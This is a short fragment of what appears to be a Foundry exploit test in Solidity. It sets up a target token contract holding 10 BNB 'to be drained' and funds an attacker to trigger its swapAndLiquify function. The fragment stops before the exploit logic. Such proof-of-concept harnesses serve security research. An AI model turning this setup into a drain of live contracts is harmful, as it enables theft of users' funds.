    function setUp() public {
        // Seed the target contract with 10 BNB to be drained
        deal(TARGET, 10 ether);

        // The amount of tokens needed to trigger swapAndLiquify is 1e18
        uint256 tokensToTrigger = 1 ether; // 1e18

        // Give the attacker enough tokens to trigger the swap and for the subsequent transfer
        deal(TARGET, attacker, tokensToTrigger + 1);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record attacker's initial BNB balance
        uint256 initialBalance = attacker.balance;
        console.log("Attacker initial balance: %s", initialBalance);

